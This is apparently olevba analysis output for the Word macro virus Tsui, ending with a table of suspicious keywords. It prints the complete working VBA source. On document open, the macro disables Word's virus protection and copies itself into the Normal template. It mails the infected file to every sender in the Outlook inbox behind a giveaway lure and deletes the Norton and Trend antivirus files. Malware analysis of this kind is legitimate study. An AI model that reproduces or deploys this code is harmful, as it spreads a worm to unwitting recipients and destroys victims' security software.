olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsui-de07b3871b774cdb201362437df1c2d412c1483a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsui-de07b3871b774cdb201362437df1c2d412c1483a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'³o¬O¤@°¦¥Î¨Ó¬ã¨s¥Îªºµ{¦¡,°ò¥»¤W¤£·|³y¦¨¥ô¦ó¹q¸£ªº¶Ë®`
'§Æ±æ¯à´£¨Ñµ¹¦³¿³½ì¬ã¨s¥¨¶°µ{¦¡ªº¤H
'§Ú¤£¹ªÀy±z§ó§ï³o­Óµ{¦¡
'¥H§K³y¦¨¥L¤H¶Ë®`
'§Þ³N:ÁÍ¶Õ¬ì§Þ´£¨Ñ(¬ö©s§»¥ý¥Í¤j§@¥¨¶°¯f¬r§¹¥þ¯}¸Ñ¤â¥U),·L³n¤ä´©(¦UÃþvba¤â¥U)
'§@ªÌ:®çªá®q¥D
On Error Resume Next
Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48)
havevir = 0
doc = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
nor = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
If nor > Abs(havevir) And doc > Abs(havevir) Then GoTo tsuicy
If nor = Abs(havevir) Then
    Set norset = NormalTemplate.VBProject.VBComponents
    Set docset = ActiveDocument.VBProject.VBComponents
    docset.Item(1).Name = norset.Item(1).Name
    docset.Item(1).Export Windows.Application.Path & ".dll"
End If
If doc = Abs(havevir) Then Set norset = ActiveDocument.VBProject.VBComponents
norset.Item(1).codemodule.AddFromFile Windows.Application.Path & ".dll"
With norset.Item(1).codemodule
   For j = Chr(49) To Chr(52)
   .deletelines 1
   Next j
    End With
If nor = Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
tsuicy:
If nor <> Abs(havevir) And doc = Abs(havevir) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Tasks.Exists("Microsoft Outlook") = True Then
'MsgBox "outlook is running"
Set myoutapp = CreateObject("outlook.application")
Set mynamespace = myoutapp.getnamespace("MAPI")
Set myinboxfolder = mynamespace.getdefaultfolder(6)
Set myitems = myinboxfolder.items
For j = 1 To myitems.Count
 Set myitem = myitems(j)
 Set newitem = myoutapp.createitem(0)
 newitem.Subject = "³Ì¨üÅwªï¥D¼½°Ý¨é½Õ¬d"
 newitem.body = "½Ð¶ñ§´°Ý¨éE-MAIL¦^tvbs·s»D³¡,§Ú­Ì±N°e±zNOKIA 8810¤â¾÷¤@°¦"
 newitem.To = myitem.SenderName
 newitem.attachments.Add ActiveDocument.FullName
 'newitem.Display
 newitem.send
 Next
 
 Set new1item = myoutapp.createitem(0)
 new1item.Subject = "§Ú¥þ¤O¤ä«ù½±¶®²N"
 new1item.body = "¥þ¥xÆW³ÌÀuªº¥D¼½´N¬O©p°Õ.......§Ú¤ä«ù©p"
 new1item.To = "vivian_chiang@mail.ftv.com.tw"
 new1item.send
 
End If
If Day(Now) = 30 And Month(Now) = 6 Then
 MsgBox "±Z§g¿Phappy birthday"
End If

Dim str1file As String
str1file = Dir("c:\program files\", vbDirectory)
Do Until str1file = ""
If str1file = "Norton AntiVirus" Then
str2 = "c:\program files\" & str1file
'MsgBox "norton is found"
With Application.FileSearch
 .LookIn = str2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 Kill .FoundFiles(i)
 Next i
End If
End With
End If
str1file = Dir
Loop

Dim pcfile As String
pcfile = Dir("c:\program files\", vbDirectory)
Do Until pcfile = ""
pcdir = Left(pcfile, 10)
If pcdir = "Trend PC-c" Then
pcstr2 = "c:\program files\" & pcfile
'MsgBox "pc-cllin is found"
With Application.FileSearch
 .LookIn = pcstr2
 .SearchSubFolders = False
 .FileName = "*.*"
 If .Execute() > 0 Then
 For i = 1 To .FoundFiles.Count
 Kill .FoundFiles(i)
 Next i
End If
End With
End If
'MsgBox str1file
pcfile = Dir
Loop
lo:
With Assistant.NewBalloon
.Heading = "³Ì¨üÅwªï¥D¼½°Ý¨é"
.Text = "­þ¤@¦ì¬O¥xÆW³ÌÄêªº¹qµø¥D¼½?"
.Checkboxes(1).Text = "§õ¥|ºÝ"
.Checkboxes(2).Text = "¨H¬KµØ"
.Checkboxes(3).Text = "À¹©¾¤¯"
.Checkboxes(4).Text = "±i¶®µ^"
.Checkboxes(5).Text = "½±¶®²N"
.Button = msoButtonSetOK
.Show

Select Case True
Case .Checkboxes(1).Checked
MsgBox "¥L¤£ºâÄê,ÁÙ®¼¦³½s¿è¯à¤O": GoTo lo
Case .Checkboxes(2).Checked
MsgBox "¦oÁöµMÄê,«o«D³ÌÄê,­Ë¼Æ²Ä¤G¦Ó¤w": GoTo lo
Case .Checkboxes(3).Checked
MsgBox "Áö±`¦YÁ³µ·,¥u¬O´¶³qÄê": GoTo lo
Case .Checkboxes(4).Checked
MsgBox "¨S¿ù!¥þ¥xÆW³ÌÄêªº¹qµø¥D¼½´N¬O¦o-±i¶®µ^"
Case .Checkboxes(5).Checked
MsgBox "§ÚªY½àªº¥D¼½,¦³¤~®ð,¤£¿ù®@": GoTo lo
Case Else
GoTo lo
End Select
Select Case False
End Select
End With


End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

